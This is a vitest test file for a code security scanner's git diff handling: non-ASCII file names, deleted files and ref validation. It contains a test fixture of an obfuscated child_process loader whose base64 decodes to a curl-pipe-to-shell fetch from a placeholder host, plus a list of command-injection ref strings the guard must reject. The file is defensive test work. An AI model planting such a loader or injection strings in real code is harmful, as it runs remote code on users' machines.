import { describe, it, expect } from "vitest";
import * as fs from "node:fs";
import * as os from "node:os";
import * as path from "node:path";
import { execFileSync } from "node:child_process";
import { getChangedFilesResult, getUncommittedFiles } from "../diff-scanner.js";
import { scan } from "../scanner.js";

const PAYLOAD =
  'const cp = require("child_process");\n' +
  'cp.exec(Buffer.from("Y3VybCAtcyBodHRwczovL2V4YW1wbGUuaW52YWxpZC94IHwgc2g=", "base64").toString());\n';

function makeRepo(): { dir: string; git: (...args: string[]) => string } {
  const dir = fs.mkdtempSync(path.join(os.tmpdir(), "scg-diff-sec-"));
  const git = (...args: string[]) =>
    execFileSync(
      "git",
      ["-c", "user.name=Test", "-c", "user.email=test@example.invalid", "-c", "commit.gpgsign=false", ...args],
      { cwd: dir, stdio: "pipe", encoding: "utf-8" },
    );
  git("init", "-q");
  return { dir, git };
}

describe("F18: --since keeps changed files with non-ASCII names", () => {
  it("lists and scans a changed file named with non-ASCII characters", async () => {
    const { dir, git } = makeRepo();
    try {
      fs.writeFileSync(path.join(dir, "index.js"), "export const value = 1;\n");
      git("add", "-A");
      git("commit", "-qm", "first");
      const first = git("rev-parse", "HEAD").trim();
      fs.writeFileSync(path.join(dir, "plain.js"), PAYLOAD);
      fs.writeFileSync(path.join(dir, "é中.js"), PAYLOAD);
      git("add", "-A");
      git("commit", "-qm", "second");

      const result = getChangedFilesResult(dir, first);
      expect(result.status).toBe("ok");
      expect(result.files.map((f) => path.basename(f)).sort()).toEqual(["plain.js", "é中.js"].sort());

      const report = await scan({ target: dir, format: "json", sinceCommit: first, noHistory: true });
      expect(report.summary.filesScanned).toBe(2);
      const files = new Set(report.findings.map((f) => f.file).filter(Boolean));
      expect([...files].some((f) => String(f).includes("é中.js"))).toBe(true);
    } finally {
      fs.rmSync(dir, { recursive: true, force: true });
    }
  });

  it("getUncommittedFiles resolves non-ASCII tracked and untracked names", () => {
    const { dir, git } = makeRepo();
    try {
      fs.writeFileSync(path.join(dir, "ü.js"), "1;\n");
      git("add", "-A");
      git("commit", "-qm", "first");
      fs.writeFileSync(path.join(dir, "ü.js"), "2;\n");
      fs.writeFileSync(path.join(dir, "é.js"), "3;\n");
      const files = getUncommittedFiles(dir).map((f) => path.basename(f)).sort();
      expect(files).toEqual(["é.js", "ü.js"].sort());
      expect(getUncommittedFiles(dir).every((f) => fs.existsSync(f))).toBe(true);
    } finally {
      fs.rmSync(dir, { recursive: true, force: true });
    }
  });

  it("a deleted file is not a failure, an unresolvable changed path is", () => {
    const { dir, git } = makeRepo();
    try {
      fs.writeFileSync(path.join(dir, "a.js"), "1;\n");
      fs.writeFileSync(path.join(dir, "b.js"), "1;\n");
      git("add", "-A");
      git("commit", "-qm", "first");
      const first = git("rev-parse", "HEAD").trim();
      fs.rmSync(path.join(dir, "a.js"));
      fs.writeFileSync(path.join(dir, "b.js"), "2;\n");
      git("add", "-A");
      git("commit", "-qm", "second");
      const ok = getChangedFilesResult(dir, first);
      expect(ok.status).toBe("ok");
      expect(ok.files.map((f) => path.basename(f))).toEqual(["b.js"]);

      // The changed file vanishes from the working tree: cannot be scanned.
      fs.rmSync(path.join(dir, "b.js"));
      expect(getChangedFilesResult(dir, first).status).toBe("error");
    } finally {
      fs.rmSync(dir, { recursive: true, force: true });
    }
  });
});

describe("F40: ancestry suffixes are accepted, everything else stays rejected", () => {
  it("accepts HEAD~1, HEAD^, HEAD^2, main~3 syntax and resolves HEAD~1", () => {
    const { dir, git } = makeRepo();
    try {
      fs.writeFileSync(path.join(dir, "a.js"), "1;\n");
      git("add", "-A");
      git("commit", "-qm", "first");
      fs.writeFileSync(path.join(dir, "b.js"), "1;\n");
      git("add", "-A");
      git("commit", "-qm", "second");
      const r = getChangedFilesResult(dir, "HEAD~1");
      expect(r.status).toBe("ok");
      expect(r.files.map((f) => path.basename(f))).toEqual(["b.js"]);
      expect(getChangedFilesResult(dir, "HEAD^").status).toBe("ok");
      // Syntactically accepted by the guard; git itself fails (no such parent),
      // which is a different error path than the guard rejecting the string.
      expect(getChangedFilesResult(dir, "HEAD^2").status).toBe("error");
      expect(getChangedFilesResult(dir, "main~3").status).toBe("error");
    } finally {
      fs.rmSync(dir, { recursive: true, force: true });
    }
  });

  it("still rejects options and metacharacters without running git", () => {
    const bad = [
      "-HEAD~1", "--output=x", "HEAD~1;id", "HEAD~1 && id", "HEAD@{1}", "HEAD:file",
      "$(id)", "`id`", "HEAD~1\nHEAD", "~1", "^HEAD", "HEAD~-1", "HEAD~1|id",
    ];
    for (const ref of bad) {
      expect(getChangedFilesResult("/nonexistent-scg-dir", ref), ref).toEqual({ status: "error", files: [] });
    }
  });
});
